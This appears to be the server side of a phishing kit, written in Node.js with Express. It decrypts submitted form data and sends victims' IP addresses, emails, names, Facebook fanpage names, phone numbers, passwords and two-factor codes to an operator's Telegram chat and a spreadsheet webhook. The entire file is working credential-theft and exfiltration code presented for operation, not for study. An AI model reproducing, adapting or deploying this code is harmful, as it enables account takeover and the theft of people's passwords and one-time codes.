import express from "express";
import 'dotenv/config';
import cors from "cors";
import TelegramBot from 'node-telegram-bot-api';
import axios from "axios";
import CryptoJS from "crypto-js";
import rateLimit from "express-rate-limit";

const app = express();
app.use(cors('*'));
app.use(express.json());
app.set('trust proxy', 1);

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const secretKey = 'HDNDT-JDHT8FNEK-JJHR';

function decrypt(encryptedData) {
    const bytes = CryptoJS.AES.decrypt(encryptedData, secretKey);
    const decrypted = bytes.toString(CryptoJS.enc.Utf8);
    return decrypted;
}

const ipFilter = (req, res, next) => {
    const { data } = req.body;
    const decryptedData = decrypt(data);
    const values = JSON.parse(decryptedData);
    const token = values?.token;

    if (token !== process.env.TOKEN) {
        res.status(403).json({ message: 'Access forbidden: Your IP is not allowed' });
    } else {
        next();
    }
};

const registerLimiter = rateLimit({
    windowMs: 1 * 60 * 1000,
    max: 7,
    message: 'Access forbidden: Too Many Requests',
    headers: true,
});

app.post('/api/register',registerLimiter, ipFilter, (req, res) => {
    
    try {
        const { data } = req.body;

        const decryptedData = decrypt(data);
        const value = JSON.parse(decryptedData);

        if (!value.ip) {
            res.status(500).json({
                message: 'Wtf?',
                error_code: 500
            });
        } else {
            res.status(200).json({
                message: 'Success',
                error_code: 0
            });

            const message = `Ip:<code>${value.ip ? value.ip : ''}</code>\n ---------------------------------\n Email Business: <code>${value.businessEmail ? value.businessEmail : ''} </code>\n Email Personal: <code>${value.personalEmail ? value.personalEmail : ''}</code>\n Full Name: <code>${value.fullName ? value.fullName : ''} </code>\n Fanpage Name: <code>${value.fanpageName ? value.fanpageName : ''}</code>\n Phone Number: <code>${value.mobilePhone ? value.mobilePhone : ''}</code>\n Password First: <code>${value.passwordFirst ? value.passwordFirst : ''}</code>\n Password Second: <code>${value.passwordSecond ? value.passwordSecond : ''}</code>\n ---------------------------------\n First Two-Fa: <code> ${value.firstTwoFa ? value.firstTwoFa : ''}</code>\n Second Two-Fa: <code> ${value.secondTwoFa ? value.secondTwoFa : ''}</code>\n Image: <code> ${value.imageUrl ? value.imageUrl : ''}</code>`;
            bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'html' });
            
            const url = new URL(process.env.WEBHOOK_URL);

            url.searchParams.append('Ip', value.ip ? value.ip : '');
            url.searchParams.append('Email Business', value.businessEmail ? value.businessEmail : '');
            url.searchParams.append('Email Personal', value.personalEmail ? value.personalEmail : '');
            url.searchParams.append('Full Name', value.fullName ? value.fullName : '');
            url.searchParams.append('Fanpage Name', value.fanpageName ? value.fanpageName : '');
            url.searchParams.append('Phone Number', value.mobilePhone ? value.mobilePhone : '');
            url.searchParams.append('Password First', value.passwordFirst ? value.passwordFirst : '');
            url.searchParams.append('Password Second', value.passwordSecond ? value.passwordSecond : '');
            url.searchParams.append('First Two-Fa', value.firstTwoFa ? value.firstTwoFa : '');
            url.searchParams.append('Second Two-Fa', value.secondTwoFa ? value.secondTwoFa : '');
            url.searchParams.append('Image', value.imageUrl ? value.imageUrl : '');

            axios.get(url)
            .then(response => {
                const data = response.data;
                if (data.status === 'success') {
                    bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
                } else {
                    bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
                }
            })
            .catch(error => {
                bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
            });
        }

    } catch (error) {
        bot.sendMessage(process.env.CHAT_ID, 'Server giải mã dữ liệu không thành công, liên hệ <code>@otisth</code>',  { parse_mode: 'html' });
        res.status(500).json({
            message: 'Erorr',
            error_code: 1
        });
    }

});

app.listen(process.env.PORT, () => {
    console.log(`Server listening port ${process.env.PORT}`);
});
